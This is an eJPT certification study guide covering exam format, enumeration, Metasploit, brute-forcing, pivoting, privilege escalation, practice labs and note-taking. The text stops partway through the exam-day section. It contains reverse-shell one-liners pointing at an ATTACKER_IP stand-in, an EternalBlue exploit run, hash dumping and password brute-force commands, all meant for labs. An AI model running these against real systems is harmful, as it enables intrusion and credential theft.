# eJPT (eLearnSecurity Junior Penetration Tester) --- Complete Study Guide & Roadmap

------------------------------------------------------------------------

## Before You Start Reading

I made this guide after passing eJPT. When I started preparing, I had
notes scattered everywhere. Some YouTube links stopped working, some
commands were missing, and I kept forgetting small things during labs.
So I decided to organize everything into one place.

This isn't the only way to pass eJPT. It's simply the method that worked
for me. During the exam I made mistakes that cost me time, and I don't
want you to repeat them.

If you're completely new to this cyber security, don't worry. I was too. The eJPT
is built for beginners. You don't need years of experience. What you
need is patience, practice, and a methodical approach.

------------------------------------------------------------------------

## Exam Format (Updated March 2026)

  -----------------------------------------------------------------
  Detail                           Information
  -------------------------------- --------------------------------
  Questions                        **45** practical, scenario-based
                                   questions (expanded from 35 in
                                   the March 2026 update)

  Passing Score                    70% overall --- plus a minimum
                                   score in each domain

  Duration                         48 hours, open book

  Delivery                         Browser-based Kali Linux VM

  Cost                             \~\$249 standalone, or
                                   \$299/year INE subscription
                                   (includes training + exam)

  Report Writing                   Not required

  Proctoring                       None

  Certifying Body                  INE Security (formerly
                                   eLearnSecurity)

  Validity                         3 years from issue date

  Retake Policy                    1 free retake included; must be
                                   used within 14 days of first
                                   attempt

  Voucher Validity                 180 days from purchase
  -----------------------------------------------------------------

> **Note:** The exam was updated in March 2026. It now has 45 questions
> (up from 35), with expanded web application testing, deeper
> reconnaissance coverage, and new content on using AI tools responsibly
> in pentesting. If you see old blog posts mentioning 35 questions,
> they're outdated.

### The 4 Domains

Each domain has its own weight toward your overall score, *and* its own
separate minimum you must clear. Pass three domains and fail the fourth,
and you fail the whole exam --- regardless of your overall percentage.

  -----------------------------------------------------------------
  Domain                Weight                Minimum Score
                                              Required
  --------------------- --------------------- ---------------------
  Assessment            25%                   90%
  Methodologies                               

  Host and Network      25%                   80%
  Auditing                                    

  Host and Network      35%                   70%
  Penetration Testing                         

  Web Application       15%                   60%
  Penetration Testing                         
  -----------------------------------------------------------------

Assessment Methodologies carries the strictest bar (90%) despite being a
smaller slice of the exam --- recon and enumeration mistakes are the
most expensive ones you can make here.

### What the Exam Environment Actually Feels Like

- You click "Start Exam" and a Kali Linux VM opens directly in your
  browser.
- You're given a network range --- find your own IP with `ip a s`, then
  scan out from there.
- Expect 4--5 target machines.
- The questions themselves contain hints --- reading them carefully is
  half the exam.
- Copy-paste in and out of the browser VM can be unreliable --- don't
  count on it.
- You can't download outside tools into the VM. Whatever's on Kali by
  default is what you have.

> **Before you read any further:** the single biggest score-saver in
> this entire guide isn't a tool or a technique --- it's how you handle
> the questions themselves. If you only have time to properly read one
> section, make it **Part 11**.

------------------------------------------------------------------------

## The Study Plan: Roughly 15--20 Days

This guide is built as a progressive plan --- foundations first, then
the core skills that answer most exam questions, then practice labs that
simulate the real thing, finishing with exam-day strategy. Treat the day
count as a rough guide, not a deadline; the order matters more than the
exact pace.

- **Days 1--3:** Foundations --- Linux, networking, web basics (Parts
  1--3)
- **Days 4--8:** Core tools --- enumeration, exploitation (Parts 4--5),
  easy labs (Part 10, Phase 1)
- **Days 9--13:** Pivoting, privilege escalation (Parts 6--7), medium
  labs (Part 10, Phase 2)
- **Days 14--16:** Hard labs and pivoting practice (Part 10, Phase 3)
- **Days 17--18:** Final practice / exam simulation (Part 10, Phase 4)
- **Days 19--20:** Revision (Part 10, Phase 5) --- then read Part 11
  once more before booking the exam

------------------------------------------------------------------------

## PART 1: Linux Basics (What You Actually Need)

If you're already comfortable working from history and muscle memory,
that carries over directly into the exam. A few fundamentals worth
having solid anyway:

`# Navigation`\
`pwd``                     ``# Where am I`\
`ls`` ``-la``                  ``# List files, including hidden`\
`cd`` /etc                 ``# Change directory`\
`cd`` ..                   ``# One level up`\
`cd`` ~                    ``# Home directory`\
\
`# File Operations`\
`cat`` file.txt            ``# Print file content`\
`head`` ``-20`` file.txt       ``# First 20 lines`\
`tail`` ``-20`` file.txt       ``# Last 20 lines`\
`nano`` file.txt           ``# Simple text editor`\
`cp`` file1 file2          ``# Copy`\
`mv`` file1 /tmp/          ``# Move`\
`rm`` file.txt             ``# Delete (careful)`\
`mkdir`` folder_name       ``# Make directory`\
\
`# Search`\
`grep`` ``"password"`` file.txt            ``# Search inside a file`\
`find`` / ``-name`` ``"*.txt"`` ``2``>``/dev/null    ``# Search the filesystem`\
`locate`` file.txt                     ``# Fast search (needs updatedb)`\
\
`# System Info`\
`whoami``                   ``# Current user`\
`id``                        ``# User details, groups`\
`uname`` ``-a``                 ``# System info`\
`ps`` aux                   ``# Running processes`\
`cat`` /etc/passwd           ``# User list`\
`cat`` /etc/shadow           ``# Password hashes (root only)`\
`cat`` /etc/os-release        ``# OS version`\
`env``                        ``# Environment variables`\
\
`# Network`\
`ip`` a s                    ``# Your IP addresses — check this first, always`\
`ifconfig``                  ``# Same idea, older command`\
`netstat`` ``-antp``               ``# Open ports / connections`\
`ss`` ``-tnl``                     ``# Same as netstat, newer tool`\
`ping`` 192.168.1.1            ``# Connectivity check`\
\
`# Permissions`\
`ls`` ``-la`` file.txt              ``# View permissions`\
`chmod`` +x script.sh            ``# Make executable`\
`chown`` user:user file          ``# Change owner`\
\
`# Locations worth knowing`\
`/etc/passwd``    /etc/shadow    /etc/crontab`\
`/var/log/``      /tmp/          /home/    /root/`

### Exam Shortcuts

`Ctrl+R``                        ``# Reverse search command history`\
`history`` ``|`` ``grep`` nmap            ``# Find earlier nmap commands`\
`Ctrl+L``                          ``# Clear screen`\
`Ctrl+Shift+C`` / Ctrl+Shift+V     ``# Copy / paste in most Linux terminals`\
`Alt+.``                            ``# Reuse the last argument of the previous command`

### Where to Learn This

Search YouTube for **"NetworkChuck Linux for hackers"** for a
beginner-friendly intro, or **"freeCodeCamp Linux"** for a longer,
thorough walkthrough. You don't need to be a Linux expert --- you just
need to move around comfortably.

------------------------------------------------------------------------

## PART 2: Networking Basics

If you already know subnetting, treat this as a refresher rather than
new material.

### Ports Worth Memorizing

`21    FTP     file transfer`\
`22    SSH     remote login`\
`23    Telnet  old, insecure SSH`\
`25    SMTP    send email`\
`53    DNS`\
`80    HTTP`\
`110   POP3    receive email`\
`143   IMAP`\
`443   HTTPS`\
`445   SMB     Windows file sharing — very important`\
`3306  MySQL`\
`3389  RDP     Windows remote desktop`\
`5900  VNC`\
`8080  HTTP alternate / proxy`

### Subnetting Quick Reference

`Class A: 1.0.0.0   – 126.255.255.255   (/8)`\
`Class B: 128.0.0.0 – 191.255.255.255   (/16)`\
`Class C: 192.0.0.0 – 223.255.255.255   (/24)`\
\
`Private ranges:`\
`10.0.0.0/8       (10.0.0.0    – 10.255.255.255)`\
`172.16.0.0/12    (172.16.0.0  – 172.31.255.255)`\
`192.168.0.0/16   (192.168.0.0 – 192.168.255.255)`

`ip`` a s                            ``# Your IP`\
`netdiscover`` ``-r`` 192.168.1.0/24     ``# Live hosts on the network`\
`nmap`` ``-sn`` 192.168.1.0/24           ``# Same idea, via nmap`

### Where to Learn This

Search YouTube for **"subnetting explained"** --- plenty of solid 10--30
minute refreshers out there; any well-rated one will do the job. You
don't need to calculate subnets by hand in the exam, but you do need to
understand what a `/24` means when you see it.

------------------------------------------------------------------------

## PART 3: Web Application Basics

### HTTP Basics

`Browser → Server : HTTP REQUEST`\
`Server → Browser : HTTP RESPONSE`\
\
`Methods:`\
`GET     Request a page (most common)`\
`POST    Send data (login forms, etc.)`\
`PUT     Update data`\
`DELETE  Delete data`\
\
`Status codes:`\
`200        OK`\
`301 / 302  Redirect`\
`400        Bad request`\
`401        Unauthorized (login required)`\
`403        Forbidden (no permission)`\
`404        Not found`\
`500        Server error`

### URL Structure

`https://example.com:443/admin/login.php?id=1`\
\
`https://      protocol (secure)`\
`example.com   domain`\
`:443          port (HTTPS default)`\
`/admin/       directory`\
`/login.php    file`\
`?id=1         query parameter`

### Headers Worth Knowing

`Request headers (you send):`\
`User-Agent       browser identity`\
`Cookie           session data`\
`Authorization    credentials`\
\
`Response headers (server sends):`\
`Server           software (Apache, Nginx, etc.)`\
`Set-Cookie       sets a session cookie`\
`Location         redirect target`

### WordPress Basics (New in 2026 Update)

WordPress enumeration is now part of the exam. Common checks:

`curl`` http://``<``target-ip``>``/wp-login.php          ``# Check if WordPress login exists`\
`curl`` http://``<``target-ip``>``/wp-content/           ``# WordPress content directory`\
`curl`` http://``<``target-ip``>``/xmlrpc.php            ``# WordPress API endpoint`\
`wpscan`` ``--url`` http://``<``target-ip``>``               ``# Full WordPress scan (if installed)`

Common WordPress files to check: - `/wp-config.php` --- contains
database credentials (sometimes accessible) - `/wp-content/uploads/` ---
user uploads, sometimes contains sensitive files - `/readme.html` ---
reveals WordPress version

### Where to Learn This

TryHackMe's **"Web Application Basics"** room walks through all of this
hands-on. For a plain-English primer first, search YouTube for **"HTTP
explained"**.

------------------------------------------------------------------------

## PART 3B: What's New in the March 2026 Update

The eJPT exam was significantly updated in March 2026. Here's what
changed and what you need to know:

### New Content Areas

**1. Expanded Assessment Methodologies** - Target Scoping ---
understanding what you're allowed to test - Passive vs Active
Reconnaissance --- knowing when to stay quiet vs. when to scan - 12 new
assessment questions added to this domain

**2. Enhanced Web Application Testing** - Web server scanning with
Nikto - Directory enumeration with Gobuster - CMS security testing
(WordPress fundamentals) - File and directory brute-forcing - 21 new web
app assessment questions

**3. Offensive AI for Pentesters (New Course)** - How to use generative
AI responsibly in pentesting workflows - Prompt engineering basics for
security tasks - Using AI to enhance analysis and productivity - This is
a practical, no-hype introduction --- not about replacing your skills,
but augmenting them

### What This Means for You

The exam went from 35 to **45 questions**, but the core skills haven't
changed dramatically. The extra questions mostly test the same
fundamentals with more depth in web apps and reconnaissance.

If you've been studying the old material, you don't need to start over.
Just make sure you: - Practice Nikto and Gobuster more thoroughly -
Understand the difference between passive and active recon - Know basic
WordPress enumeration (wp-login.php, /wp-content/, etc.) - Are
comfortable with the idea of using AI tools as assistants, not
replacements

### Updated Exam Numbers

  -----------------------------------------------------------------
  Old (pre-March 2026)             New (March 2026 onwards)
  -------------------------------- --------------------------------
  35 questions                     45 questions

  Same 4 domains                   Same 4 domains, expanded content

  48 hours                         48 hours (unchanged)

  70% overall pass                 70% overall pass (unchanged)
  -----------------------------------------------------------------

------------------------------------------------------------------------

## PART 4: Enumeration --- the Most Important Skill

Roughly 70% of eJPT comes down to enumeration. Enumerate thoroughly and
most answers surface on their own.

### Nmap (your most important tool in the exam)

`nmap`` 192.168.1.1                    ``# Basic scan`\
`nmap`` ``-sV`` 192.168.1.1                ``# Service version detection`\
`nmap`` ``-O`` 192.168.1.1                 ``# OS detection`\
`nmap`` ``-A`` 192.168.1.1                 ``# Aggressive — everything at once`\
\
`# Best commands for the exam:`\
`nmap`` ``-sC`` ``-sV`` ``-O`` 192.168.1.1         ``# Default scripts + version + OS`\
`nmap`` ``-p-`` 192.168.1.1                ``# All 65535 ports (slow, thorough)`\
`nmap`` ``-sV`` ``-sC`` ``-O`` ``-p-`` 192.168.1.1     ``# Full scan — the one to actually run`\
\
`# Multiple hosts:`\
`nmap`` ``-sV`` 192.168.1.0/24             ``# Whole subnet`\
`nmap`` ``-sV`` ``-iL`` targets.txt            ``# From a file of IPs`\
\
`# Save output — every time, no exceptions:`\
`nmap`` ``-sV`` ``-sC`` ``-O`` ``-oN`` nmap_scan.txt 192.168.1.1`\
`nmap`` ``-sV`` ``-sC`` ``-O`` ``-oX`` nmap_scan.xml 192.168.1.1`

### SMB Enumeration

`enum4linux`` ``-a`` 192.168.1.1`\
`smbclient`` ``-L`` 192.168.1.1`\
`smbclient`` //192.168.1.1/share`\
`nmap`` ``-p445`` ``--script`` smb-enum-shares 192.168.1.1`\
`nmap`` ``-p445`` ``--script`` smb-enum-users 192.168.1.1`\
`nmap`` ``-p445`` ``--script`` smb-os-discovery 192.168.1.1`

### Web Enumeration

`gobuster`` dir ``-u`` http://192.168.1.1 ``-w`` /usr/share/wordlists/dirb/common.txt`\
`gobuster`` dir ``-u`` http://192.168.1.1 ``-w`` /usr/share/wordlists/dirb/common.txt ``-x`` .php,.txt,.html`\
`dirb`` http://192.168.1.1`\
`nikto`` ``-h`` http://192.168.1.1`

> **New in March 2026 update:** Nikto and Gobuster are now explicitly
> tested. Make sure you're comfortable with both. Gobuster for finding
> hidden directories, Nikto for vulnerability scanning on web servers.

### Where to Learn This

Search YouTube for **"Nmap tutorial"** (NetworkChuck and HackerSploit
both have solid entry points) and **"Gobuster tutorial"** for directory
brute-forcing. Don't just watch --- open a terminal and follow along.

------------------------------------------------------------------------

## PART 5: Exploitation Tools

### Metasploit Framework

`msfconsole`\
\
`# Basic workflow:`\
`search`` ms17-010`\
`use`` exploit/windows/smb/ms17_010_eternalblue`\
`show`` options`\
`set`` RHOSTS 192.168.1.1`\
`set`` LHOST 192.168.1.10`\
`set`` LPORT 4444`\
`exploit`\
\
`# Payloads:`\
`set`` PAYLOAD windows/meterpreter/reverse_tcp`\
`set`` PAYLOAD linux/x86/meterpreter/reverse_tcp`\
\
`# Meterpreter, once you have a session:`\
`help`\
`sysinfo`\
`getuid`\
`ps`\
`ls`\
`cd`\
`cat`` file.txt`\
`download`` file.txt`\
`upload`` shell.exe`\
`shell`\
`background`\
`sessions`` ``-l`\
`sessions`` ``-i`` 1`\
\
`# Hash dumps:`\
`hashdump`\
`use`` post/linux/gather/hashdump`\
\
`# Privilege escalation:`\
`getsystem``                                        ``# Windows`\
`use`` post/windows/gather/win_privs`\
`use`` post/multi/recon/local_exploit_suggester     ``# Linux`

### Hydra (Brute Force)

`hydra`` ``-l`` admin ``-P`` /usr/share/wordlists/rockyou.txt ssh://192.168.1.1`\
`hydra`` ``-L`` users.txt ``-P`` passwords.txt ssh://192.168.1.1`\
`hydra`` ``-l`` admin ``-P`` /usr/share/wordlists/rockyou.txt ftp://192.168.1.1`\
`hydra`` ``-l`` admin ``-P`` /usr/share/wordlists/rockyou.txt 192.168.1.1 http-post-form ``"/login.php:username=^USER^&password=^PASS^:F=invalid"`\
\
`# -l single user   -L user list   -p single password   -P password list   -t threads (default 16)`

### John the Ripper

`john`` hash.txt`\
`john`` ``--wordlist``=``/usr/share/wordlists/rockyou.txt hash.txt`\
`john`` ``--format``=``nt hash.txt            ``# Windows NTLM`\
`john`` ``--format``=``sha512crypt hash.txt   ``# Linux SHA512`\
`john`` ``--show`` hash.txt`\
\
`zip2john`` file.zip ``>`` zip_hash.txt ``&&`` ``john`` zip_hash.txt`\
`ssh2john`` id_rsa ``>`` ssh_hash.txt ``&&`` ``john`` ssh_hash.txt`

### Netcat

`nc`` ``-lvnp`` 4444                        ``# Listener on your machine`\
\
`nc`` ``-e`` /bin/sh ATTACKER_IP 4444       ``# Linux reverse shell (if -e is supported)`\
`nc`` ``-e`` cmd.exe ATTACKER_IP 4444       ``# Windows reverse shell`\
\
`nc`` ``-nv`` 192.168.1.1 80                ``# Banner grabbing`

> Kali's default `nc` (openbsd-netcat) usually **doesn't** support `-e`.
> If it errors out, use a bash one-liner
> (`bash -i >& /dev/tcp/IP/4444 0>&1`) or `ncat --exec` instead --- both
> are in the companion cheat sheet.

### SQLmap

`sqlmap`` ``-u`` ``"http://192.168.1.1/page.php?id=1"`` ``--batch`\
`sqlmap`` ``-u`` ``"http://192.168.1.1/page.php?id=1"`` ``--dbs`` ``--batch`\
`sqlmap`` ``-u`` ``"http://192.168.1.1/page.php?id=1"`` ``-D`` database_name ``--tables`` ``--batch`\
`sqlmap`` ``-u`` ``"http://192.168.1.1/page.php?id=1"`` ``-D`` database_name ``-T`` users ``--dump`` ``--batch`

### Where to Learn This

Search YouTube for **"Metasploit for beginners"** (The Cyber Mentor /
TCM Security has a well-regarded practical series), **"Hydra brute force
tutorial"**, **"John the Ripper tutorial"**, and **"SQLmap tutorial"**.
Again --- follow along in a terminal, don't just watch.

------------------------------------------------------------------------

## PART 6: Pivoting

Pivoting means using a machine you've already compromised to reach a
second, otherwise-hidden network.

`[You / Attacker] → [Compromised Machine 1] → [Hidden Machine 2]`\
`                                                (not directly reachable)`

### Pivoting via Meterpreter

`meterpreter`` ``>`` background`\
\
`use`` post/multi/manage/autoroute`\
`set`` SESSION 1`\
`set`` SUBNET 192.168.100.0        ``# the hidden network you found`\
`set`` NETMASK 255.255.255.0`\
`run`\
\
`route`` print`\
\
`use`` auxiliary/server/socks_proxy`\
`set`` SRVPORT 9050`\
`run`\
\
`proxychains`` nmap ``-sT`` ``-Pn`` 192.168.100.10`

### Port Forwarding

`meterpreter`` ``>`` portfwd add ``-l`` 1234 ``-p`` 80 ``-r`` 192.168.100.10`\
`# now 127.0.0.1:1234 on your machine routes to 192.168.100.10:80`\
\
`meterpreter`` ``>`` portfwd list`\
`meterpreter`` ``>`` portfwd delete ``-l`` 1234 ``-p`` 80 ``-r`` 192.168.100.10`

### What to Actually Do in the Exam

1.  After landing any shell, run `ipconfig` (Windows) or `ifconfig`
    (Linux).
2.  A second network interface (e.g. `192.168.100.x`) is your signal
    that pivoting is in play.
3.  Add the route with `run autoroute`.
4.  Start a SOCKS proxy and scan the second network through
    `proxychains`.

### Where to Learn This

Search YouTube for **"Metasploit pivoting tutorial"**, and practice on
TryHackMe's **Wreath** room --- it's built specifically to teach this
skill end to end. Pivoting is the #1 reason people fail eJPT. Practice
it until it's boring.

------------------------------------------------------------------------

## PART 7: Privilege Escalation Basics

### Linux Checklist

`whoami``;`` ``id``;`` ``groups`\
\
`sudo`` ``-l``                                     ``# What can I run without a password?`\
\
`uname`` ``-a``;`` ``uname`` ``-r``                          ``# Kernel version — old kernel = possible exploit`\
\
`find`` / ``-perm`` ``-4000`` ``-type`` f ``2``>``/dev/null      ``# SUID binaries`\
\
`cat`` /etc/crontab``;`` ``crontab`` ``-l``                ``# Scheduled jobs`\
\
`ps`` aux                                      ``# Running processes`\
\
`find`` / ``-writable`` ``-type`` d ``2``>``/dev/null        ``# Writable directories`\
\
`dpkg`` ``-l``        ``# Debian/Ubuntu installed packages`\
`rpm`` ``-qa``        ``# CentOS/RHEL`\
\
`netstat`` ``-antp``;`` ``ss`` ``-tnl``                      ``# Network connections`

### Windows Checklist

`whoami`\
`whoami ``/groups`\
`whoami ``/priv`\
\
`systeminfo`\
\
`wmic qfe get Caption,Description,HotFixID,InstalledOn`\
\
`sc query`\
`wmic service get name,displayname,startmode,pathname`\
\
`schtasks ``/query`` ``/fo`` LIST ``/v`\
\
`accesschk.exe ``-uws`` ``"Everyone"`` ``"C:\Program Files"`

### Where to Learn This

TryHackMe's **Linux PrivEsc** and **Windows PrivEsc** rooms (both listed
in Part 10) are the standard practice ground. For video, search **"Linux
privilege escalation"** / **"Windows privilege escalation"** ---
IppSec's walkthroughs are a good reference once you've genuinely tried a
room yourself first. Don't watch the solution before attempting the
problem. You'll learn nothing.

------------------------------------------------------------------------

## PART 8: Docker Basics (Not Tested, Good to Know)

Docker doesn't appear on the eJPT exam itself, but it's everywhere in
the industry, so it's worth basic familiarity:

`docker`` ps                           ``# Running containers`\
`docker`` images                       ``# Image list`\
`docker`` run ``-it`` ubuntu bash          ``# Start an Ubuntu container`\
`docker`` exec ``-it`` container_id bash   ``# Get a shell in a running container`\
`docker`` stop container_id            ``# Stop a container`

Background knowledge only --- don't spend study time here before the
exam.

------------------------------------------------------------------------

## PART 9: Report Writing --- There Isn't Any

eJPT doesn't require a written report; you're only answering 45
questions. What you *do* need is disciplined note-taking during the
exam, not for anyone else's benefit but so you don't lose track of what
you've already found. The full method for this --- the single most
valuable part of this guide --- is in **Part 11**. In short, track for
every machine:

- IP address
- OS (Windows/Linux)
- Open ports and service versions
- Credentials found
- Which question(s) it answers

Screenshot anything important --- findings, shells, flags --- for your
own reference as you work.

------------------------------------------------------------------------

## PART 10: Practice Labs Sequence (Easy → Medium → Hard)

**Before working through the list below:** TryHackMe rebuilt its entire
**Jr Penetration Tester** learning path in 2026 --- it's now 89 rooms
across 17 modules, including a full Active Directory module and a
rewritten web security section, and it now doubles as prep for
TryHackMe's own PT1 certification:
**tryhackme.com/path/outline/jrpenetrationtester**. eJPT itself doesn't
lean heavily on Active Directory, so if time is tight, prioritize the
network and web sections of that path and treat AD as a bonus for later
career growth. The room-by-room list below is a more targeted set, built
specifically around the kind of scenarios eJPT actually uses.

*(If a specific link below has moved, search the room name directly
inside TryHackMe/HackTheBox --- the name is more durable than any URL.)*

### Phase 1: Easy Labs --- Build Confidence

**TryHackMe (free rooms):**

  -----------------------------------------------------------------
  Room                  Focus                 Time
  --------------------- --------------------- ---------------------
  Basic Pentesting      Enumeration, brute    2--3 hrs
                        force, hash cracking, 
                        priv esc              

  Pickle Rick           Web enumeration       1--2 hrs

  RootMe                Web exploit,          2--3 hrs
                        msfvenom, priv esc    

  Simple CTF            Basic enumeration and 1--2 hrs
                        exploitation          

  Bounty Hacker         FTP, brute force,     1--2 hrs
                        priv esc              

  Ignite                Web exploit, priv esc 1--2 hrs

  LazyAdmin             Enumeration, exploit, 2--3 hrs
                        priv esc              

  Agent Sudo            Basic forensics,      1--2 hrs
                        steganography         

  Fowsniff CTF          Enumeration, brute    1--2 hrs
                        force                 
  -----------------------------------------------------------------

**HackTheBox (Starting Point, Tier 0/1):** Meow, Fawn, Dancing,
Appointment, Sequel, Crocodile, Responder, Three --- each isolates one
specific skill (basic connections, FTP, SMB, SQLi, MySQL, priv esc, S3
buckets).

### Phase 2: Medium Labs --- Strengthen Skills

**TryHackMe:**

  -----------------------------------------------------------------
  Room                  Focus                 Time
  --------------------- --------------------- ---------------------
  Skynet                SMB, web exploit,     3--4 hrs
                        priv esc              

  Startup               Multiple chained      3--4 hrs
                        attacks               

  Wgel CTF              Enumeration, SSH,     2--3 hrs
                        priv esc              

  Chill Hack            SQL injection, priv   3--4 hrs
                        esc                   

  ToolsRus              Brute force, web      2--3 hrs
                        exploit               

  GamingServer          SSH key cracking,     2--3 hrs
                        priv esc              

  Brooklyn Nine Nine    Steganography, priv   2--3 hrs
                        esc                   

  Further Nmap          Deep Nmap practice    2--3 hrs

  Metasploit Intro      Metasploit basics     2--3 hrs

  Vulnversity           Web exploit, priv esc 2--3 hrs

  Steel Mountain        Windows priv esc      3--4 hrs

  Alfred                Jenkins, Windows priv 2--3 hrs
                        esc                   

  Hack Park             Windows, brute force  3--4 hrs
  -----------------------------------------------------------------

### Phase 3: Hard Labs + Pivoting --- Exam Level

**TryHackMe:**

  -----------------------------------------------------------------
  Room                  Focus                 Time
  --------------------- --------------------- ---------------------
  Wreath                **Pivoting --- the    4--6 hrs
                        most important room   
                        here**                

  Linux PrivEsc         Privilege escalation  3--4 hrs

  Windows PrivEsc       Privilege escalation  3--4 hrs

  Internal              Closest THM           4--5 hrs
                        equivalent to the     
                        eJPT exam itself      
  -----------------------------------------------------------------

**HackTheBox (retired/easy machines):** Lame (SMB exploit), Blue
(EternalBlue), Legacy (SMB), Devel (FTP + ASP), Optimum (web exploit),
Bastard (Drupal exploit).

### Phase 4: Final Practice --- Exam Simulation

**VulnHub:** DC-1, DC-2 (WordPress brute force), DC-3 (Joomla exploit),
Kioptrix Level 1 (basic network exploit), Mr-Robot (WordPress, brute
force).

### Phase 5: Revision + Confidence

- Revise all your notes.
- Move any command you keep forgetting straight onto your cheat sheet.
- Review Nmap's full option list once more.
- Re-run through Metasploit's basic commands.
- Walk through the pivoting steps once more, end to end.

------------------------------------------------------------------------

## PART 11: Exam Day Strategy --- The Centralized Question-Mapping Method

This is the part of the guide that actually moves your score. Everything
above teaches the skills; this section is about not wasting them.

### The Core Idea

The usual advice is "read the questions first," and most people take
that to mean *skim them once, then go scan stuff.* That's not quite it.
The method that actually works is:

**Read every question carefully, and while reading, build a single
centralized notes document that sorts the questions by what will answer
them --- before running a single scan.**

Here's why this matters: in a 45-question, 4--5 machine exam, the
questions are *not* grouped by machine or topic --- they're scattered.
One question might come straight from your Nmap scan; the next might
concern a completely different host; the one after that might depend on
something you'll only uncover three steps into a privilege escalation
chain on a third machine. Attack machines one at a time without a map of
what's actually being asked, and you'll end up re-reading the same 45
questions over and over --- and, worse, doing work the exam never
actually required.


### A Practical Example of Organized Notes (I prefer this structure from now on.)

To make the centralized question-mapping method easier to understand, here's a simplified example of how I prefer organized  notes during the exam. The exact format doesn't matter—you can use a text file, Markdown, Notion, or a spreadsheet. The important thing is to keep everything in one place.

---

## Step 1 – Read Every Question First

Before running a single command, I read all the questions and grouped them by the type of information they seemed to require. At this stage, I didn't know which machine they belonged to yet.

```text
Nmap / Initial Enumeration
--------------------------
Q1  → Open Ports
Q4  → Service Version
Q8  → Operating System
Q12 → HTTP Server
Q19 → SMB Version

Web Application
---------------
Q2  → Login Page
Q6  → Directory Enumeration
Q10 → CMS Detection
Q15 → Hidden File
Q22 → Web Technology

FTP
---
Q3  → FTP Banner
Q9  → Anonymous Login
Q18 → Downloaded File

SMB
---
Q5  → Share Name
Q14 → Username
Q20 → Accessible Files

SSH
---
Q7  → SSH Login
Q16 → User Shell

Windows
--------
Q24 → Administrator Password
Q27 → Privilege Escalation

Linux
------
Q25 → User Flag
Q29 → Sudo Privileges

Pivoting
---------
Q37 → Internal Network
Q40 → Hidden Host
Q44 → Final Target
```

Once completed host discovery and  initial Nmap scans, replaced those categories with the actual machines.

---

## Step 2 – Map Questions to Machines

```text
192.168.10.5 (Linux)
--------------------
Q1
Q3
Q6
Q8
Q15

192.168.10.10 (Windows)
-----------------------
Q5
Q12
Q18
Q24
Q27

192.168.10.15 (Linux)
---------------------
Q20
Q25
Q29

192.168.20.5 (Pivot)
--------------------
Q37
Q40
Q44
```

From this point onward, stopped thinking in terms of "45 questions" and instead worked on **one machine at a time**.

---

## Step 3 – Host Inventory

| IP Address    | Operating System | Open Ports | Status      |
| ------------- | ---------------- | ---------- | ----------- |
| 192.168.10.5  | Linux            | 21,22,80   | Enumerated  |
| 192.168.10.10 | Windows          | 445,3389   | In Progress |
| 192.168.10.15 | Linux            | 22,8080    | Pending     |

---

## Machine 1 — 192.168.10.5

```text
OS:
Linux

Ports:
21 FTP
22 SSH
80 HTTP

Interesting Findings:
- Anonymous FTP Enabled
- Apache Web Server
- Hidden /backup directory

Credentials:
anonymous : anonymous

Questions Related:
Q1
Q3
Q6
Q8
Q15

Status:
✔ Completed
```

---

## Machine 2 — 192.168.10.10

```text
OS:
Windows

Ports:
445 SMB
3389 RDP

Interesting Findings:
- SMB Share Found
- Valid Username Discovered

Credentials:
john : ********

Questions Related:
Q5
Q12
Q18
Q24
Q27

Status:
⏳ Working
```

---

## Credentials Log

| Username  | Password  | Source    | Used On   |
| --------- | --------- | --------- | --------- |
| anonymous | anonymous | FTP       | Machine 1 |
| john      | ********  | SMB       | Machine 2 |
| admin     | ********  | Web Login | Machine 3 |

---

## Useful Files

```text
nmap/
├── machine1.txt
├── machine2.txt
├── machine3.txt

screenshots/
loot/
hashes/
credentials.txt
notes.txt
```

---

## Progress Tracker

```text
Total Questions : 45

Completed : 19

Need Enumeration : 11

Need Privilege Escalation : 8

Need Pivoting : 4

Need Review : 3
```

This example is **not from the actual exam**. It simply demonstrates the workflow I prefer to used to stay organized throughout the assessment. By first grouping questions by category, then mapping them to individual machines after enumeration, and finally maintaining detailed notes for each host, I always knew what I had already completed, what credentials I had discovered, and which questions were still unanswered. This simple workflow saved me from repeating the same work and made it much easier to track my progress across multiple targets.



### A Real Story From My Exam

Before eJPT, I used to do CTFs the "normal" way --- find one machine,
hack it, get root, move on. I never worked with multiple machines at
once, and I never took proper notes. I just ran commands and hoped for
the best.

During my eJPT exam, I got stuck on a Windows machine for almost an
hour. I had brute-forced a valid username and password, and I kept
trying every possible way to get an RDP session with those credentials.
Nothing worked. I was getting frustrated.

Then I re-read the question. It wasn't asking me to log in as that user
at all. It was asking for the **administrator's password on that same
machine**. I had been so focused on privilege escalation that I never
stopped to check what the question actually wanted. The moment I re-read
it, the path became obvious: brute-force the administrator account
directly. I found the password, logged in, and got the flag in minutes.


That hour I wasted? It was because I didn't have my questions mapped and
centralized. I was attacking blindly instead of letting the questions
guide me.

**The lesson:** The exact wording of the question defines the actual
scope of the task. If something effortful is taking a long time --- full
privilege escalation, a chained exploit, whatever --- stop and check
whether the question actually requires going that far. Often it doesn't.

### Step by Step

**1. Read all 45 questions first, before touching a tool.**

Actually read each one, not a skim. Sort them into rough buckets as you
go: - Questions you can already tell will come from the Nmap scan
directly --- service versions, open ports, banners (typically 10--15 of
the 45) - Questions tied to a specific protocol (SMB, FTP, web, etc.)
rather than a known host yet - Questions that are clearly about a
specific OS ("on the Windows machine...", "the administrator
account...")

**2. Run host discovery.** Find what's actually alive on the network.

**3. Shortlist and record every live IP** in your notes.

**4. Run a full Nmap scan on each one**, saved to a file. You'll now
know the OS, open ports, and services for every host --- go back and
slot each IP into the buckets from step 1.

**5. Answer the direct Nmap-derived questions immediately.** This is
often a quarter of the exam, done inside the first hour or two.

**6. Work through the rest host by host, IP by IP** --- not randomly.
For each IP, your notes already say which questions it owes you. Treat
it as a checklist per host, not "let's see what happens."

**7. When you get stuck, re-read the exact question again before pushing
harder.**

This step saves the most time, and it's the one people skip.

### A Simple Notes Template

Keep one table like this running for the entire exam. A plain text file
or a spreadsheet both work --- it just needs to stay in front of you the
whole time.

`IP              | OS       | Open Ports/Services          | Questions This IP Owes Me       | Status`\
`----------------|----------|-------------------------------|-----------------------------------|----------`\
`192.168.1.10    | Linux    | 21 (FTP, anon), 22, 80 (Apache)| Q3 (ftp banner), Q7 (web tech)   | Q3 done, Q7 open`\
`192.168.1.15    | Windows  | 445 (SMB), 3389 (RDP)          | Q12 (share name), Q19 (admin pw) | in progress`

Alongside it, keep a running scratch list of every credential found, the
moment it's found --- username, password, and where it came from.
Nothing costs more time than surfacing a password on hour 3 and needing
it again on hour 20 with no record of it.

### Hour-by-Hour Walkthrough

`Hour 0–0.25`\
`- Read the lab guidelines and letter of engagement`\
